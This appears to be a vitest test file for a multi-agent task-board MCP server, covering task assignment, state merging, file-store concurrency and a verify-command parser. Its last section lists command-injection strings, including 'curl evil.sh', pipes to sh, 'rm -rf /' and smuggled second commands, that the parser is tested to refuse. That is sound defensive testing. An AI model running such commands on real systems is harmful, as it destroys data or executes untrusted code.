import { existsSync } from "node:fs";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { BoardTemplateSchema } from "@blkc-code/core";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { createAgentServer, parseVerifyCommand, runVerifyCommand, TASK_BOARD, TASK_STATES, createFileStore, diffEvents, mergeLiveAgents, nextTask, normalizeState, setAgent, type AgentStore, type AgentsState, type LiveAgent } from "./index.js";
import { createHerdrBridge } from "@blkc-code/herdr";

let dir: string;
beforeEach(async () => { dir = await mkdtemp(path.join(tmpdir(), "blkc-agents-")); });
afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

function memoryStore(): AgentStore {
  let current = normalizeState({});
  return {
    read: async () => current,
    update: async (change) => {
      const next = normalizeState(current);
      change(next);
      current = normalizeState(next);
      return current;
    },
  };
}

const state = (patch: Partial<AgentsState>): AgentsState => normalizeState(patch);

describe("normalizeState", () => {
  it("keeps what is safe and drops the rest", () => {
    const clean = normalizeState({
      agents: [{ name: "Ada\u0007 Lovelace", state: "flying" }, { name: "ada lovelace" }, { name: "" }],
      tasks: [{ title: "Ship", state: "nope" }, { title: "" }],
      stats: { questsDone: -3 },
    });
    expect(clean.agents).toEqual([{ id: "ada-lovelace", name: "Ada Lovelace", state: "idle" }]);
    expect(clean.tasks).toEqual([{ title: "Ship", state: "todo" }]);
    expect(clean.stats.questsDone).toBe(0);
  });

  it("survives input that isn't an object", () => {
    for (const bad of [null, undefined, 7, "x", []]) expect(normalizeState(bad).agents).toEqual([]);
  });
});

describe("nextTask", () => {
  it("does not hand out a child until its parent is in review or done", () => {
    const office = state({ tasks: [
      { title: "Parent", state: "todo" },
      { title: "Child", state: "todo", parent: "Parent", kind: "test" },
    ] });
    expect(nextTask(office, "ada")?.title).toBe("Parent");
    office.tasks[0]!.state = "review";
    expect(nextTask(office, "ada")?.title).toBe("Child");
  });

  it("prefers the agent's own task, and never hands out one from another agent", () => {
    const office = state({ tasks: [
      { title: "From a peer", state: "todo", by: "mallory" },
      { title: "Open", state: "todo" },
      { title: "Mine", state: "todo", agent: "ada" },
    ] });
    expect(nextTask(office, "ada")?.title).toBe("Mine");
    expect(nextTask(office, "grace")?.title).toBe("Open");
    office.tasks = office.tasks.filter((task) => task.title === "From a peer");
    expect(nextTask(office, "grace")).toBeUndefined();
  });
});

describe("nextTask and who wrote a task", () => {
  it("doesn't hand over a task another agent assigned", () => {
    const office = state({ tasks: [{ title: "Do this", state: "todo", agent: "ada", by: "mallory" }] });
    expect(nextTask(office, "ada")).toBeUndefined();
  });

  it("hands over tasks from the user, and an agent's own", () => {
    const office = state({ tasks: [{ title: "Own", state: "todo", agent: "ada", by: "ada" }, { title: "User", state: "todo", agent: "grace", by: "user" }] });
    expect(nextTask(office, "ada")?.title).toBe("Own");
    expect(nextTask(office, "grace")?.title).toBe("User");
  });
});

describe("diffEvents", () => {
  it("has nothing to say the first time", () => {
    expect(diffEvents(undefined, state({ agents: [{ id: "a", name: "A", state: "blocked" }] }))).toEqual([]);
  });

  it("reports joins, blocks, finishes, departures and finished tasks", () => {
    const before = state({
      agents: [{ id: "a", name: "A", state: "working" }, { id: "b", name: "B", state: "working" }, { id: "c", name: "C", state: "idle" }],
      tasks: [{ title: "T", state: "doing" }],
    });
    const after = state({
      agents: [{ id: "a", name: "A", state: "blocked" }, { id: "b", name: "B", state: "done" }, { id: "d", name: "D", state: "idle" }],
      tasks: [{ title: "T", state: "done" }],
    });
    expect(diffEvents(before, after).map((event) => event.type)).toEqual(["agent.blocked", "agent.finished", "agent.joined", "agent.left", "task.finished"]);
  });

  it("doesn't repeat a state that hasn't changed", () => {
    const same = state({ agents: [{ id: "a", name: "A", state: "blocked" }] });
    expect(diffEvents(same, same)).toEqual([]);
  });
});

describe("createFileStore", () => {
  it("starts from the fallback, then from the file", async () => {
    const file = path.join(dir, "state.json");
    const store = createFileStore(file, () => ({ agents: [{ name: "Sample" }] }));
    expect((await store.read()).agents[0]?.name).toBe("Sample");
    await store.update((s) => { s.agents = []; });
    expect((await store.read()).agents).toEqual([]);
  });

  it("loses nothing when many writers arrive at once", async () => {
    const store = createFileStore(path.join(dir, "state.json"));
    await Promise.all(Array.from({ length: 25 }, (_, i) => store.update((s) => { setAgent(s, { name: `agent ${i}` }); })));
    expect((await store.read()).agents).toHaveLength(25);
  });

  it("counts each finished task once, even after it is deleted", async () => {
    const store = createFileStore(path.join(dir, "state.json"));
    await store.update((s) => { s.tasks.push({ title: "T", state: "done" }); });
    await store.update((s) => { s.tasks = []; });
    expect((await store.read()).stats.questsDone).toBe(1);
  });
});

describe("TASK_BOARD", () => {
  it("is a valid board, with a column for every task state", () => {
    expect(BoardTemplateSchema.safeParse(TASK_BOARD).success).toBe(true);
    expect(TASK_BOARD.columns.map((column) => column.id)).toEqual([...TASK_STATES]);
  });
});

describe("the MCP server", () => {
  /** Not a file: this is what a hosted product would supply. */
  it("runs on any store, not only a file", async () => {
    const store = memoryStore();
    const server = createAgentServer(store, { version: "0.0.0" });
    const client = new Client({ name: "test", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);

    const tools = (await client.listTools()).tools.map((tool) => tool.name);
    expect(tools).toContain("office_status");
    await client.callTool({ name: "office_status", arguments: { agent: "Ada", state: "working" } });
    const after = await store.read();
    expect(after.agents[0]).toMatchObject({ id: "ada", state: "working" });
    await client.close();
  });

  it("can go by another name, for another product", async () => {
    const server = createAgentServer(memoryStore(), { version: "0.0.0", prefix: "team" });
    const client = new Client({ name: "test", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);
    const tools = (await client.listTools()).tools.map((tool) => tool.name);
    expect(tools).toContain("team_status");
    expect(tools.some((tool) => tool.startsWith("office_"))).toBe(false);
    expect(client.getInstructions()).toContain("team_next_quest");
    await client.close();
  });

  it("supports a review and verdict loop", async () => {
    const store = memoryStore();
    const server = createAgentServer(store, { version: "0.0.0" });
    const client = new Client({ name: "Ada", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);

    await client.callTool({ name: "office_add_quest", arguments: { title: "Build feature", kind: "code", role: "coder", verify: "npm test" } });
    await client.callTool({ name: "office_status", arguments: { agent: "Ada", state: "idle", role: "coder" } });
    await client.callTool({ name: "office_next_quest", arguments: { agent: "Ada" } });
    await client.callTool({ name: "office_submit_review", arguments: { agent: "Ada" } });
    const afterSubmit = await store.read();
    expect(afterSubmit.tasks[0]).toMatchObject({ state: "review", verdict: "pending" });

    await client.callTool({ name: "office_report_verdict", arguments: { quest: "Build feature", verdict: "fail", evidence: "3 tests failed" } });
    const afterFail = await store.read();
    expect(afterFail.tasks[0]).toMatchObject({ state: "todo", verdict: "fail" });
    expect(afterFail.tasks[0]?.evidence).toContain("3 tests failed");

    // reopen -> review -> pass
    await client.callTool({ name: "office_next_quest", arguments: { agent: "Ada" } });
    await client.callTool({ name: "office_submit_review", arguments: { agent: "Ada" } });
    await client.callTool({ name: "office_report_verdict", arguments: { quest: "Build feature", verdict: "pass", evidence: "all green" } });
    const afterPass = await store.read();
    expect(afterPass.tasks[0]).toMatchObject({ state: "done", verdict: "pass" });

    await client.close();
  });

  it("runs a feature's tests and records verdicts", async () => {
    const passFile = path.join(dir, "pass.test.mjs");
    const failFile = path.join(dir, "fail.test.mjs");
    await writeFile(passFile, 'import test from "node:test"; test("ok", () => {});\n');
    await writeFile(failFile, 'import test from "node:test"; test("no", () => { throw new Error("boom"); });\n');
    const store = memoryStore();
    const server = createAgentServer(store, { version: "0.0.0", root: process.cwd() });
    const client = new Client({ name: "Ada", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);

    await client.callTool({ name: "office_add_quest", arguments: { title: "Parent", kind: "code" } });
    await client.callTool({ name: "office_add_quest", arguments: { title: "Child pass", kind: "test", parent: "Parent", verify: `node --test ${passFile}` } });
    await client.callTool({ name: "office_add_quest", arguments: { title: "Child fail", kind: "test", parent: "Parent", verify: `node --test ${failFile}` } });

    const res = await client.callTool({ name: "office_run_tests", arguments: { feature: "Parent" } });
    const text = (res.content as { text: string }[])[0]?.text ?? "{}";
    const out = JSON.parse(text) as { passed: number; failed: number; total: number };
    expect(out).toMatchObject({ passed: 1, failed: 1, total: 2 });

    const state = await store.read();
    const passTask = state.tasks.find((t) => t.title === "Child pass");
    const failTask = state.tasks.find((t) => t.title === "Child fail");
    expect(passTask).toMatchObject({ state: "done", verdict: "pass" });
    expect(failTask).toMatchObject({ state: "todo", verdict: "fail" });
    await client.close();
  });

  it("lists prompts for an agent by role", async () => {
    const store = memoryStore();
    const server = createAgentServer(store, { version: "0.0.0" });
    const client = new Client({ name: "test", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);

    await client.callTool({ name: "office_add_quest", arguments: { title: "Write tests", kind: "test", role: "tester" } });
    await client.callTool({ name: "office_add_quest", arguments: { title: "Build feature", kind: "code", role: "coder" } });
    await client.callTool({ name: "office_status", arguments: { agent: "Tia", state: "idle", role: "tester" } });
    const res = await client.callTool({ name: "office_list_prompts", arguments: { agent: "Tia" } });
    const text = (res.content as { text: string }[])[0]?.text ?? "[]";
    const list = JSON.parse(text) as { title: string }[];
    expect(list.map((x) => x.title)).toEqual(["Write tests"]);
    await client.close();
  });
});

describe("mergeLiveAgents", () => {
  const live = (patch: Partial<LiveAgent>): LiveAgent => ({
    id: "ada",
    name: "Ada",
    state: "working",
    lastSeen: "2026-01-01T00:00:00.000Z",
    alive: true,
    ...patch,
  });

  it("keeps quests and task text untouched", () => {
    const base = normalizeState({
      agents: [{ id: "ada", name: "Ada", state: "idle", task: "old task" }],
      tasks: [{ title: "Q1", state: "todo", agent: "ada", detail: "d" }],
      stats: { questsDone: 3 },
    });
    const merged = mergeLiveAgents(base, [live({ state: "blocked" })]);
    expect(merged.tasks).toEqual(base.tasks);
    expect(merged.stats).toEqual(base.stats);
    expect(merged.agents[0]?.task).toBe("old task");
  });

  it("overlays Herdr state onto a matching agent", () => {
    const base = normalizeState({ agents: [{ id: "ada", name: "Ada", state: "idle" }] });
    const merged = mergeLiveAgents(base, [live({ state: "working", model: "opus", space: "w1" })]);
    expect(merged.agents[0]).toMatchObject({ state: "working", model: "opus", space: "w1" });
  });

  it("does not clobber an explicit area with a cwd-derived one", () => {
    const base = normalizeState({ agents: [{ id: "ada", name: "Ada", state: "idle", area: "kitchen" }] });
    const merged = mergeLiveAgents(base, [live({ area: "garage" })]);
    expect(merged.agents[0]?.area).toBe("kitchen");
  });

  it("fills area when the agent has none", () => {
    const base = normalizeState({ agents: [{ id: "ada", name: "Ada", state: "idle" }] });
    const merged = mergeLiveAgents(base, [live({ area: "garage" })]);
    expect(merged.agents[0]?.area).toBe("garage");
  });

  it("adds panes Herdr knows about but the office doesn't", () => {
    const base = normalizeState({});
    const merged = mergeLiveAgents(base, [live({ id: "grace", name: "Grace", state: "done" })]);
    expect(merged.agents).toHaveLength(1);
    expect(merged.agents[0]).toMatchObject({ id: "grace", state: "done" });
  });

  it("marks an exited pane as away", () => {
    const base = normalizeState({});
    const merged = mergeLiveAgents(base, [live({ alive: false, state: "working" })]);
    expect(merged.agents[0]?.state).toBe("away");
  });

  it("is a no-op when Herdr reports nothing", () => {
    const base = normalizeState({ agents: [{ id: "ada", name: "Ada", state: "idle" }] });
    const merged = mergeLiveAgents(base, []);
    expect(merged).toEqual(base);
  });
});

describe("createHerdrBridge", () => {
  it("reports unavailable when herdr is missing", async () => {
    const bridge = createHerdrBridge({ run: () => ({ status: 1, stdout: "", stderr: "nope" }) });
    expect(bridge.available()).toBe(false);
    await expect(bridge.listAgents()).resolves.toEqual([]);
  });

  it("reports available via HERDR_ENV", () => {
    const bridge = createHerdrBridge({ env: { HERDR_ENV: "1" }, run: () => ({ status: 1, stdout: "", stderr: "" }) });
    expect(bridge.available()).toBe(true);
  });

  it("parses pane list json defensively", async () => {
    const bridge = createHerdrBridge({
      env: { HERDR_ENV: "1" },
      run: (args) => {
        if (args[0] === "pane") {
          return { status: 0, stdout: JSON.stringify([{ agent: "Ada", agent_status: "working", foreground_cwd: "/tmp/proj/src", tokens: { model: "opus" }, workspace: "w1" }]), stderr: "" };
        }
        return { status: 1, stdout: "", stderr: "" };
      },
    });
    const agents = await bridge.listAgents();
    expect(agents).toHaveLength(1);
    expect(agents[0]).toMatchObject({ id: "ada", state: "working", model: "opus", space: "w1" });
    expect(agents[0]?.cwd).toBe("/tmp/proj/src");
  });

  it("returns [] on malformed json", async () => {
    const bridge = createHerdrBridge({
      env: { HERDR_ENV: "1" },
      run: () => ({ status: 0, stdout: "{not json", stderr: "" }),
    });
    expect(await bridge.listAgents()).toEqual([]);
  });
});

describe("verify commands are never run through a shell", () => {
  it("allows plain test commands", () => {
    for (const ok of ["npm test", "npm run test:unit", "pnpm test -- --reporter=dot", "npx vitest run src/a.test.ts", "bunx playwright test", "pytest -q tests/", "python3 -m pytest", "go test ./...", "cargo test", "node --test", "yarn exec jest"]) {
      expect(parseVerifyCommand(ok), ok).toMatchObject({ ok: true });
    }
  });

  it("refuses shell syntax, other programs and eval flags", () => {
    for (const bad of ["npm test; touch /tmp/x", "npm test && curl evil.sh", "npm test | sh", "npm test `id`", "npm test $(id)", "npm test > out", "echo hi", "rm -rf /", "sh -c id", "bash x.sh", "curl http://x", "true", "node -e process.exit(0)", "node --test --import=./evil.mjs", "npx cowsay", "python -c print(1)", "npm test\ntouch /tmp/x", "npm 'test'"]) {
      expect(parseVerifyCommand(bad), bad).toMatchObject({ ok: false });
    }
  });

  it("an injected command does not run", async () => {
    const marker = path.join(dir, "pwned");
    const result = runVerifyCommand(`npm test; touch ${marker}`, dir);
    expect(result.pass).toBe(false);
    expect(result.refused).toBeTruthy();
    expect(existsSync(marker)).toBe(false);
  });

  it("run_tests over MCP records a refusal as a fail without running it", async () => {
    const marker = path.join(dir, "pwned-mcp");
    const store = memoryStore();
    const server = createAgentServer(store, { version: "0.0.0", root: dir });
    const client = new Client({ name: "Mallory", version: "0.0.0" });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await Promise.all([server.connect(a), client.connect(b)]);
    await client.callTool({ name: "office_add_quest", arguments: { title: "Feature", kind: "code" } });
    await client.callTool({ name: "office_add_quest", arguments: { title: "Sneaky", kind: "test", parent: "Feature", verify: `touch ${marker}` } });
    await client.callTool({ name: "office_run_tests", arguments: { feature: "Feature" } });
    expect(existsSync(marker)).toBe(false);
    const sneaky = (await store.read()).tasks.find((t) => t.title === "Sneaky");
    expect(sneaky).toMatchObject({ verdict: "fail" });
    expect(sneaky?.evidence).toContain("Refused");
    await client.close();
  });
});
